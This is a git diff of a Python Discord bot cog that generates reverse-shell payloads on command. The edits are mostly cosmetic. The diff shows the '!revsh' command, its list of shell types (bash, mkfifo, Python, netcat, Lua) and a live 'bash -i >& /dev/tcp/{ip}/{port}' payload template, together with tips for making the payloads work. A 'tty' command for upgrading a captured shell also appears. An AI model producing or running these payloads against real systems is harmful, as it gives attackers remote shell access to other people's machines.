@@ -9,19 +9,17 @@ class ReverseShellCog(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
 
-    @commands.command(help="Generate a payload for a reverse shell depending on the type of shell asked, using the specified IP and port.\n Usage: !revsh <type> <ip> <port>\n Types: bash-i, bash196, readline, mkfifo, py1, py2, nc-e, nc-c, lua")
+    @commands.command(help="Generate a payload for a reverse shell depending on the type of shell asked, using the specified IP and port.\n Usage: `!revsh <type> <ip> <port>`\n Types: `bash-i`, `bash196`, `readline`, `mkfifo`, `py1`, `py2`, `nc-e`, `nc-c`, `lua`")
     async def revsh(self, ctx, type: str, ip: str, port: int):
         """Generate a payload for a reverse shell depending on the type of shell asked, using the specified IP and port.
         
         Args:
-            type (str): Type of reverse shell to generate. Possible values: bash-i, bash196, readline, mkfifo, py1, py2, nc-e, nc-c, lua.
+            type (str): Type of reverse shell to generate. Possible values: `bash-i`, `bash196`, `readline`, `mkfifo`, `py1`, `py2`, `nc-e`, `nc-c`, `lua`.
             ip (str): IP address of the target machine.
             port (int): Port number of the target machine.
         """
         logger.info(f" Received request for reverse shell: {type}, {ip}, {port} \nUser: {ctx.author.name}\nServer: {ctx.guild.name}\nChannel: {ctx.channel.name}\n")
-
         await ctx.message.add_reaction("💀")
-
 
         # Pre-Conditions
         if port < 1 or port > 65535:
@@ -33,7 +31,6 @@ class ReverseShellCog(commands.Cog):
                 return await ctx.send("Invalid type. See the help message for the list of valid types.")
 
 
-        # Payload request
         match type.lower():
             case "bash-i":
                 payload = f"```bash\nbash -i >& /dev/tcp/{ip}/{port} 0>&1```"
@@ -65,7 +62,7 @@ class ReverseShellCog(commands.Cog):
 
         embed = discord.Embed(
             title = f"Reverse Shell Generator 💀",
-            description = f"""◈ **Type**: {type}\n\n◈ **IP**: {ip}\n\n◈ **Port**: {port}\n\n {payload} \n❗ This payload is for **Linux** only. If they are not working, try **UDP** instead of **TCP**. If you are using _code langs_ options, try to use different versions if doesn't work.""",
+            description = f"""◈ **Type**: {type}\n\n◈ **IP**: {ip}\n\n◈ **Port**: {port}\n\n {payload} \n❗ This payload is for **Linux** only. If they are not working, try **UDP** instead of **TCP**. If you are using _code langs_ options, try to use different binary versions if doesn't work.""",
             colour = discord.Colour.dark_red()
         )
         embed.set_footer(text="Shhhh, I'm a secret agent! 🕵️‍♂️")
@@ -74,7 +71,6 @@ class ReverseShellCog(commands.Cog):
 
         logger.info(f" Sent {type} reverse shell to {ctx.author.name}\n")
         await ctx.send(embed=embed)
-        return
 
 
 
@@ -82,7 +78,6 @@ class ReverseShellCog(commands.Cog):
     async def tty(self, ctx):
         """Give a cheatsheet to establish a full interactive TTY session after achieving a reverse shell."""
         logger.info(f" TTY requested\nUser: {ctx.author.name}\nServer: {ctx.guild.name}\nChannel: {ctx.channel.name}\n")
-
         await ctx.message.add_reaction("💀")
 
 
